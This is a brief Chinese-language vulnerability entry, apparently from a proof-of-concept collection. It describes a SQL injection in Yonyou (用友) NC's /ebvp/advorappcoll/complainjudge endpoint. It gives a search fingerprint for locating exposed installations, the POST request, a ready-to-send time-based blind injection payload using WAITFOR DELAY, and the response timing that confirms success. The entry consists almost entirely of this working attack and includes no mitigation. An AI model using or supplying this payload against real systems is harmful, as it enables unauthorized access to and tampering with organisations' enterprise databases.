# 用友NCcomplainjudgeSQL注入漏洞

用友 ｜ SQL注入 ｜ —
- **指纹**：`app="用友-UFIDA-NC"`
- **请求**：`POST /ebvp/advorappcoll/complainjudge HTTP/1.1`

**Payload**
```
pageId=login&pk_complaint=11%27;WAITFOR%20DELAY%20%270:0:5%27--
```
- **响应特征**：200 响应时间>=5s